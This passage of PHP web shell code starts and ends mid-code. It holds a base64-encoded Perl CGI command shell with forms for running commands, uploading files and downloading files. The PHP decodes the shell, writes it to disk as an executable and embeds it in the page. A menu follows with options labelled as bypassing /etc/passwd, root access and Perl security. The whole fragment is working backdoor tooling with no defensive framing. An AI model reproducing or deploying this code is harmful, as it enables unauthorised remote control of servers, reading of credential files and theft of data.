kQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCiRQcm9tcHQNCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQo8L2NvZGU+DQoNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGRvd25sb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtDQp7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0NCnsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsNCglwcmludCA8PEVORDsNCjxjb2RlPg0KDQo8Zm9ybSBuYW1lPSJmIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCiRQcm9tcHQgdXBsb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIHZhbHVlPSJvdmVyd3JpdGUiPg0KT3ZlcndyaXRlIGlmIGl0IEV4aXN0czxicj48YnI+DQpVcGxvYWQ6Jm5ic3A7Jm5ic3A7Jm5ic3A7PGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHRpbWVvdXQgZm9yIGEgY29tbWFuZCBleHBpcmVzLiBXZSBuZWVkIHRvDQojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMNCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIENvbW1hbmRUaW1lb3V0DQp7DQoJaWYoISRXaW5OVCkNCgl7DQoJCWFsYXJtKDApOw0KCQlwcmludCA8PEVORDsNCjwveG1wPg0KDQo8Y29kZT4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS4NCjxicj5LaWxsZWQgaXQhDQpFTkQNCgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCWV4aXQ7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlDQojIGNvbW1hbmQgYW5kIGFsbG93cyB0aGUgdXNlciB0byBlbnRlciBhbm90aGVyIGNvbW1hbmQuIFRoZSBjaGFuZ2UgZGlyZWN0b3J5DQojIGNvbW1hbmQgaXMgaGFuZGxlZCBkaWZmZXJlbnRseS4gSW4gdGhpcyBjYXNlLCB0aGUgbmV3IGRpcmVjdG9yeSBpcyBzdG9yZWQgaW4NCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQ0KIyBvdXRwdXQgb2YgdGhlIGNoYW5nZSBkaXJlY3RvcnkgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkIHRvIHRoZSB1c2Vycw0KIyB0aGVyZWZvcmUgZXJyb3IgbWVzc2FnZXMgY2Fubm90IGJlIGRpc3BsYXllZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBFeGVjdXRlQ29tbWFuZA0Kew0KCWlmKCRSdW5Db21tYW5kID1+IG0vXlxzKmNkXHMrKC4rKS8pICMgaXQgaXMgYSBjaGFuZ2UgZGlyIGNvbW1hbmQNCgl7DQoJCSMgd2UgY2hhbmdlIHRoZSBkaXJlY3RvcnkgaW50ZXJuYWxseS4gVGhlIG91dHB1dCBvZiB0aGUNCgkJIyBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQuDQoJCQ0KCQkkT2xkRGlyID0gJEN1cnJlbnREaXI7DQoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsNCgkJY2hvcCgkQ3VycmVudERpciA9IGAkQ29tbWFuZGApOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSRQcm9tcHQgPSAkV2luTlQgPyAiJE9sZERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRPbGREaXJdXCQgIjsNCgkJcHJpbnQgIiRQcm9tcHQgJFJ1bkNvbW1hbmQiOw0KCX0NCgllbHNlICMgc29tZSBvdGhlciBjb21tYW5kLCBkaXNwbGF5IHRoZSBvdXRwdXQNCgl7DQoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCgkJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJCXByaW50ICIkUHJvbXB0ICRSdW5Db21tYW5kPHhtcD4iOw0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7DQoJCWlmKCEkV2luTlQpDQoJCXsNCgkJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7DQoJCQlhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQoJCX0NCgkJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZA0KCQl7DQoJCQkkfD0xOw0KCQkJJENvbW1hbmQgLj0gIiB8IjsNCgkJCW9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KCQkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KCQkJew0KCQkJCSRfID1+IHMvKFxufFxyXG4pJC8vOw0KCQkJCXByaW50ICIkX1xuIjsNCgkJCX0NCgkJCSR8PTA7DQoJCX0NCgkJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzDQoJCXsNCgkJCXByaW50IGAkQ29tbWFuZGA7DQoJCX0NCgkJaWYoISRXaW5OVCkNCgkJew0KCQkJYWxhcm0oMCk7DQoJCX0NCgkJcHJpbnQgIjwveG1wPiI7DQoJfQ0KCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gZG93bmxvYWQgdGhlIHNwZWNpZmllZCBmaWxlLiBUaGUgcGFnZSBhbHNvIGNvbnRhaW5zIGEgYXV0by1yZWZyZXNoDQojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQoJbG9jYWwoJEZpbGVVcmwpID0gQF87DQoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzDQoJew0KCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyDQoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNClNlbmRpbmcgRmlsZSAkVHJhbnNmZXJGaWxlLi4uPGJyPg0KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksDQo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPi4NCkVORA0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQlwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRGaWxlVXJsOiAkISI7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gcmVhZHMgdGhlIHNwZWNpZmllZCBmaWxlIGZyb20gdGhlIGRpc2sgYW5kIHNlbmRzIGl0IHRvIHRoZQ0KIyBicm93c2VyLCBzbyB0aGF0IGl0IGNhbiBiZSBkb3dubG9hZGVkIGJ5IHRoZSB1c2VyLg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBTZW5kRmlsZVRvQnJvd3Nlcg0Kew0KCWxvY2FsKCRTZW5kRmlsZSkgPSBAXzsNCglpZihvcGVuKFNFTkRGSUxFLCAkU2VuZEZpbGUpKSAjIGZpbGUgb3BlbmVkIGZvciByZWFkaW5nDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWJpbm1vZGUoU0VOREZJTEUpOw0KCQkJYmlubW9kZShTVERPVVQpOw0KCQl9DQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOw0KCQkoJEZpbGVuYW1lID0gJFNlbmRGaWxlKSA9fiAgbSEoW14vXlxcXSopJCE7DQoJCXByaW50ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtdW5rbm93blxuIjsNCgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7DQoJCXByaW50ICJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0kMVxuXG4iOw0KCQlwcmludCB3aGlsZSg8U0VOREZJTEU+KTsNCgkJY2xvc2UoU0VOREZJTEUpOw0KCX0NCgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQ0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQlwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRTZW5kRmlsZTogJCEiOw0KCQkmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KDQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KfQ0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciBkb3dubG9hZHMgYSBmaWxlLiBJdCBkaXNwbGF5cyBhIG1lc3NhZ2UNCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0KIyBUaGlzIGZ1bmN0aW9uIGlzIGFsc28gY2FsbGVkIHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9uIHRoYXQgbGluay4gSW4gdGhpcyBjYXNlLA0KIyB0aGUgZmlsZSBpcyByZWFkIGFuZCBzZW50IHRvIHRoZSBicm93c2VyLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJlZ2luRG93bmxvYWQNCnsNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQoJCSghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsNCgl9DQoJZWxzZSAjIHdlIGhhdmUgdG8gc2VuZCBvbmx5IHRoZSBsaW5rIHBhZ2UNCgl7DQoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOw0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGENCiMgZmlsZSwgb3RoZXJ3aXNlIGl0IHN0YXJ0cyB0aGUgdXBsb2FkIHByb2Nlc3MuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXBsb2FkRmlsZQ0Kew0KCSMgaWYgbm8gZmlsZSBpcyBzcGVjaWZpZWQsIHByaW50IHRoZSB1cGxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCSZQcmludEZpbGVVcGxvYWRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCQlyZXR1cm47DQoJfQ0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCg0KCSMgc3RhcnQgdGhlIHVwbG9hZGluZyBwcm9jZXNzDQoJcHJpbnQgIlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkDQoJY2hvcCgkVGFyZ2V0TmFtZSkgaWYgKCRUYXJnZXROYW1lID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsNCg0KCSRUYXJnZXRGaWxlU2l6ZSA9IGxlbmd0aCgkaW57J2ZpbGVkYXRhJ30pOw0KCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KCWlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQ0KCXsNCgkJcHJpbnQgIkZhaWxlZDogRGVzdGluYXRpb24gZmlsZSBhbHJlYWR5IGV4aXN0cy48YnI+IjsNCgl9DQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQNCgl7DQoJCWlmKG9wZW4oVVBMT0FERklMRSwgIj4kVGFyZ2V0TmFtZSIpKQ0KCQl7DQoJCQliaW5tb2RlKFVQTE9BREZJTEUpIGlmICRXaW5OVDsNCgkJCXByaW50IFVQTE9BREZJTEUgJGlueydmaWxlZGF0YSd9Ow0KCQkJY2xvc2UoVVBMT0FERklMRSk7DQoJCQlwcmludCAiVHJhbnNmZXJlZCAkVGFyZ2V0RmlsZVNpemUgQnl0ZXMuPGJyPiI7DQoJCQlwcmludCAiRmlsZSBQYXRoOiAkVGFyZ2V0TmFtZTxicj4iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJcHJpbnQgIkZhaWxlZDogJCE8YnI+IjsNCgkJfQ0KCX0NCglwcmludCAiIjsNCgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCg0KCSZQcmludFBhZ2VGb290ZXI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCXJldHVybjsNCgl9DQoJDQoJIyBnZXQgZnVsbHkgcXVhbGlmaWVkIHBhdGggb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KCWlmKCgkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cXHxeLjovKSkgfA0KCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUNCgl7DQoJCSRUYXJnZXRGaWxlID0gJFRyYW5zZmVyRmlsZTsNCgl9DQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUNCgl7DQoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7DQoJfQ0KDQoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUNCgl7DQoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQkmUHJpbnREb3dubG9hZExpbmtQYWdlKCRUYXJnZXRGaWxlKTsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTWFpbiBQcm9ncmFtIC0gRXhlY3V0aW9uIFN0YXJ0cyBIZXJlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQomUmVhZFBhcnNlOw0KJkdldENvb2tpZXM7DQoNCiRTY3JpcHRMb2NhdGlvbiA9ICRFTlZ7J1NDUklQVF9OQU1FJ307DQokU2VydmVyTmFtZSA9ICRFTlZ7J1NFUlZFUl9OQU1FJ307DQokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9Ow0KJFJ1bkNvbW1hbmQgPSAkaW57J2MnfTsNCiRUcmFuc2ZlckZpbGUgPSAkaW57J2YnfTsNCiRPcHRpb25zID0gJGlueydvJ307DQoNCiRBY3Rpb24gPSAkaW57J2EnfTsNCiRBY3Rpb24gPSAibG9naW4iIGlmKCRBY3Rpb24gZXEgIiIpOyAjIG5vIGFjdGlvbiBzcGVjaWZpZWQsIHVzZSBkZWZhdWx0DQoNCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQNCiRDdXJyZW50RGlyID0gJGlueydkJ307DQpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7DQoNCiRMb2dnZWRJbiA9ICRDb29raWVzeydTQVZFRFBXRCd9IGVxICRQYXNzd29yZDsNCg0KaWYoJEFjdGlvbiBlcSAibG9naW4iIHx8ICEkTG9nZ2VkSW4pICMgdXNlciBuZWVkcy9oYXMgdG8gbG9naW4NCnsNCgkmUGVyZm9ybUxvZ2luOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikgIyB1c2VyIHdhbnRzIHRvIHJ1biBhIGNvbW1hbmQNCnsNCgkmRXhlY3V0ZUNvbW1hbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJ1cGxvYWQiKSAjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQ0Kew0KCSZVcGxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAjIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlDQp7DQoJJkRvd25sb2FkRmlsZTsNCn0NCmVsc2lmKCRBY3Rpb24gZXEgImxvZ291dCIpICMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCgkmUGVyZm9ybUxvZ291dDsNCn0=';

		$file = fopen("vw.root" ,"w+");
		$write = fwrite ($file ,base64_decode($cgipl));
		fclose($file);
		chmod("vw.root",0755);
		echo "<br><center><span style='font-size:30px; font-family:Fredericka the Great; color:#009900'>Bypass Perl Security</span><br><br><iframe src=cgipl/vw.root width=75% height=50% frameborder=0></iframe>
		 
		</div>"; 
}
elseif($_GET['do'] == 'com64') {
echo "<center>";
echo "<ul>";
echo "<li> <a href='?dir=$dir&do=betc'>Bypass /etc/passwd</a> </li>";
echo "<li> <a href='?dir=$dir&do=baus'>Bypass User Server</a> </li>";
echo "<li> <a href='?dir=$dir&do=b'>Bypass Perl Security</a> </li>";
echo "<li> <a href='?dir=$dir&do=barut'>Bypass Root Access</a> </li>";
echo "<li> <a href='?dir=$dir&do=com64'>Base64 Command</a> </li>";
echo "</ul>";
echo "</center>";
		echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:white">Base64 Command</span><center><br>';
		echo '  <tr>
			<td width="100%" height="1">';
		if (empty($_POST['fak'])){
